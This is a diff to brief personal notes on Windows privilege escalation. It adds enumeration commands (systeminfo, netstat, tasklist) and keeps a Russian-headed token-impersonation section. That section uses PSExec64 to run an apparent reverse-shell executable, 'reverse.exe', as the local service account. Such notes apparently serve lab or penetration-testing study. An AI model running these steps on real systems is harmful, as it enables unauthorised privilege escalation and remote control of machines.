@@ -1,5 +1,15 @@
 # Up_windows
 
+# enumeration
+
+systeminfo
+
+netstat -ano | findstr ":<port>"
+
+tasklist /svc
+
+
+
 # Токен имперсонейшн
 
 C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
